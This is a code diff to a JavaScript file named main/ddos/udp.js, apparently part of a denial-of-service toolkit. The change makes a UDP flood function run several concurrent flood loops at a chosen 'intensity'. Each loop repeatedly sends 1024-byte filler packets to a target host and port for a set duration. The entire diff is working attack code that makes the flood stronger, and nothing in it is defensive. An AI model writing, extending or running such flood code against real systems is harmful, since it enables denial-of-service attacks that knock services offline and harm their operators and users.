@@ -1,13 +1,26 @@
 // main/ddos/udp.js
-async function udpFlood(target, duration) {
+const dgram = require('dgram');
+
+async function udpFlood(target, duration, intensity = 10) {
   const url = new URL(target);
   const hostname = url.hostname;
   const port = url.port || 80;
 
   const startTime = Date.now();
+
+  for (let i = 0; i < intensity; i++) {
+    flood(hostname, port, duration, startTime);
+  }
+
+  console.log(`UDP flood started against ${target} with intensity ${intensity}`);
+  await new Promise(resolve => setTimeout(resolve, duration * 1000));
+  console.log(`UDP flood finished against ${target}`);
+}
+
+async function flood(hostname, port, duration, startTime) {
   while (Date.now() - startTime < duration * 1000) {
     try {
-      const socket = require('dgram').createSocket('udp4');
+      const socket = dgram.createSocket('udp4');
       const message = Buffer.alloc(1024, 'A');
 
       socket.send(message, port, hostname, (err) => {
@@ -21,7 +34,6 @@ async function udpFlood(target, duration) {
     }
     await new Promise(resolve => setTimeout(resolve, 0)); // Prevent blocking
   }
-  console.log(`UDP flood finished against ${target}`);
 }
 
 module.exports = { udpFlood };
